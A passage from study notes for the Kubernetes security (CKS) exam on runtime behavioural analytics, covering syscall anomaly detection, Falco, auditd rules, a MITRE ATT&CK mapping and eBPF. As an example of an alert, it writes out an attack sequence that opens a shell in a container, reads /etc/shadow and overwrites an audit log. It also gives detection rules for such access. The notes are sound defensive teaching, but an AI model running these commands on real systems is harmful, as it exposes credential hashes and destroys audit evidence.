- **Recurrent Neural Networks (RNNs)** trained on normal syscall sequences can detect anomalous sequences even when individual syscalls are not suspicious. A sequence of `open → read → close → open → read → close → ...` (normal file reading) versus `open → mmap → write → execve` (shellcode injection pattern) can be distinguished by sequence models.
- **Graph Neural Networks** applied to process relationship graphs detect unusual parent-child relationships — a web server process spawning a shell (abnormal) versus spawning its usual worker processes (normal).

### AI and the Evolving Attacker

AI is a double-edged sword in this domain. Just as defenders use ML to detect anomalies, attackers use ML to craft attacks that evade anomaly detection:

- **AI-crafted evasion** — attackers use reinforcement learning to find syscall sequences that bypass ML-based detection while achieving the same malicious outcome.
- **Slow-and-low automation** — AI-driven attack frameworks operate at human-indistinguishable speed — one file read per minute instead of one thousand, mimicking normal application behaviour.

This is why a layered approach — rules (Falco) + anomaly detection (Lacework, StackRox) + network monitoring + log correlation — remains necessary. No single detection method is sufficient.

---

## 14. CKS Exam Tips

This chapter establishes the conceptual foundation for the next three chapters (Falco installation, Falco rules, Falco configuration). Understanding this chapter well makes everything else in the module coherent.

**Key concepts to know for the exam:**

1. **Why behavioral analytics is needed:** Even with all preventive controls in place, breaches can occur. Early detection (like credit card instant notifications) limits damage.

2. **What syscalls are:** System calls are the interface between user-space processes and the Linux kernel. Every action a container takes — file reads, network connections, process spawns — involves syscalls.

3. **The problem with strace at scale:** strace attaches to one process at a time with significant overhead. Not suitable for monitoring hundreds of containers simultaneously.

4. **Why Falco is the answer:** Falco uses a kernel module or eBPF probe to monitor all syscalls across all containers on a node with minimal overhead, applying rules to surface suspicious events.

5. **The KodeKloud alert example:**
   ```bash
   kubectl exec -ti nginx-master -- bash
   # cat /etc/shadow > /opt/logs/audit.log
   ```
   This sequence — shell in container, reading `/etc/shadow`, overwriting audit logs — represents anomalous behaviour that Falco would detect and alert on.

6. **Anomalous behaviours Falco catches:**
   - Shell spawned inside a container
   - Reading `/etc/shadow` or other sensitive files
   - Writing to binary directories (`/usr/bin`, `/usr/sbin`)
   - Deleting or modifying audit logs
   - Unexpected outbound network connections
   - Mounting host filesystems

**What to expect in exam tasks:**
- The exam is more likely to test Falco configuration (Chapters 2-4) than this conceptual chapter. However, understanding the *why* here helps answer any conceptual questions about runtime security.
- Know the difference between **preventive controls** (RBAC, NetworkPolicies, seccomp, AppArmor) and **detective controls** (Falco, audit logs, syscall monitoring).

---

## 15. Extra Information and References

### The Linux Audit System (auditd) — Complementary to Falco

While Falco uses the syscall path directly, `auditd` is the Linux kernel's built-in audit framework. It is complementary to Falco and is often used together:

```bash
# Install auditd
apt-get install auditd

# Add an audit rule to watch /etc/shadow
auditctl -w /etc/shadow -p rwxa -k shadow-access
# -w = watch file
# -p rwxa = on read, write, execute, attribute change
# -k = key for searching logs

# Watch for execve syscalls by a specific user
auditctl -a always,exit -F arch=b64 -S execve -F uid=0 -k root-commands

# View audit logs
ausearch -k shadow-access
ausearch -k root-commands

# Generate a report
aureport --summary

# Persistent rules (survive reboots)
echo "-w /etc/shadow -p rwxa -k shadow-access" >> /etc/audit/rules.d/audit.rules
service auditd restart
```

**auditd vs Falco:**

| Aspect | auditd | Falco |
|--------|--------|-------|
| Scope | Host-level; all processes | Host-level; container-aware |
| Kubernetes integration | None | Rich (pod name, namespace, image) |
| Real-time alerting | Via audisp plugins | Native, multiple channels |
| Performance | Low overhead | Low overhead (eBPF) |
| Rule language | auditctl syntax | YAML with Sysdig filter syntax |
| Container context | No | Yes |
| Default on K8s nodes | Often yes | No (must install) |

### The MITRE ATT&CK Framework for Containers

Falco rules align with the MITRE ATT&CK framework's container techniques. Understanding this mapping helps you see which attacks each rule covers:

```
TA0001 Initial Access
  T1190 Exploit Public-Facing Application → web app exploit → exec syscall anomaly
  T1078 Valid Accounts → stolen credentials → kubectl exec

TA0002 Execution
  T1059 Command and Scripting Interpreter → shell in container → Falco: Terminal shell
  T1610 Deploy Container → privilege escalation via API

TA0004 Privilege Escalation
  T1611 Escape to Host → /proc/1/root access → Falco: Container escape

TA0005 Defense Evasion
  T1070 Indicator Removal → log deletion → Falco: Clear Log Activities

TA0007 Discovery
  T1082 System Information Discovery → reading /etc/*, /proc
  T1613 Container and Resource Discovery → kubectl list, env read

TA0009 Collection
  T1005 Data from Local System → reading sensitive files

TA0011 Command and Control
  T1071 Application Layer Protocol → C2 via HTTP → unusual outbound connect
```

### eBPF — The Technology Behind Modern Syscall Monitoring

eBPF (extended Berkeley Packet Filter) is the kernel technology that powers modern syscall monitoring tools including Falco (in eBPF mode), Tracee, and Tetragon:

- **What it is:** A sandboxed virtual machine inside the Linux kernel that allows programs to run safely in kernel space without loading kernel modules
- **Why it matters for security:** eBPF probes can intercept syscalls, network packets, and kernel functions with near-zero overhead and no risk of crashing the kernel (the eBPF verifier ensures safety)
- **Kernel requirement:** eBPF requires Linux kernel 4.14+ for basic features; 5.8+ for full CO-RE (Compile Once – Run Everywhere) support

```bash
# Check if your kernel supports eBPF
uname -r  # Need >= 4.14 for basic; >= 5.8 for full features

# Check eBPF features available
bpftool feature probe
```

### References

- [Falco Official Documentation](https://falco.org/docs/)
- [CNCF Falco Project](https://github.com/falcosecurity/falco)
- [Tracee — AquaSec](https://github.com/aquasecurity/tracee)
- [Linux man page — syscalls(2)](https://man7.org/linux/man-pages/man2/syscalls.2.html)
- [strace Documentation](https://strace.io)
- [bpftrace — eBPF scripting](https://github.com/iovisor/bpftrace)
- [MITRE ATT&CK for Containers](https://attack.mitre.org/matrices/enterprise/containers/)
- [Linux Audit System](https://linux.die.net/man/8/auditd)
- [Tetragon — Cilium eBPF enforcement](https://tetragon.io)
- [IBM Cost of a Data Breach Report](https://www.ibm.com/reports/data-breach)
- [KodeKloud CKS — Perform Behavioral Analytics](https://learn.kodekloud.com/user/courses/certified-kubernetes-security-specialist-cks/module/c0d849e1-54be-4d78-8936-6ce49434b88d/lesson/13be41c6-4b0a-45b3-a9e5-0e7d96767ecc)
